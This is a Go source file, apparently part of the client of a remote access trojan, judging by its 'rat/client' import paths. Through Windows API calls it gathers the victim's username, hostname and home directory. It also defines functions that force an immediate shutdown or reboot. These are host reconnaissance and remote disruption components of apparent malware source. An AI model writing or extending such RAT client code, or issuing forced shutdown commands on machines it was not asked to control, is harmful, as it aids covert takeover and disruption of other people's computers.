package computer

/*
#include <windows.h>
#include <Shlobj.h>
*/
import "C"

import (
	"os/exec"
	"rat/client/utils"
	"rat/internal"
	"unsafe"
)

func GetComputerInformation() shared.Computer {
	info := shared.Computer{}

	// UNLEN is less than MAX_COMPUTERNAME_LENGTH (Lmcons.h)
	const BufferSize = C.MAX_COMPUTERNAME_LENGTH + 1

	lpBuffer := make([]utils.Wchar, BufferSize)
	var lpnSize C.DWORD = BufferSize
	ptr := (*C.WCHAR)(unsafe.Pointer(&lpBuffer[0]))

	C.GetUserNameW(ptr, &lpnSize)
	info.Username = utils.TrimCStr(utils.GetWideString(lpBuffer[:lpnSize], int(lpnSize)))

	lpnSize = BufferSize
	C.GetComputerNameW(ptr, &lpnSize)
	info.Hostname = utils.TrimCStr(utils.GetWideString(lpBuffer[:lpnSize], int(lpnSize)))

	C.SHGetFolderPathW(nil, C.CSIDL_PROFILE, nil, 0, ptr)
	info.HomeDir = utils.TrimCStr(utils.GetWideString(lpBuffer, utils.GetLength(lpBuffer)))

	return info
}

func Shutdown() {
	exec.Command("shutdown", "/p", "/f").Start()
}

func Reboot() {
	exec.Command("shutdown.exe", "/t", "0", "/r", "/f").Start()
}
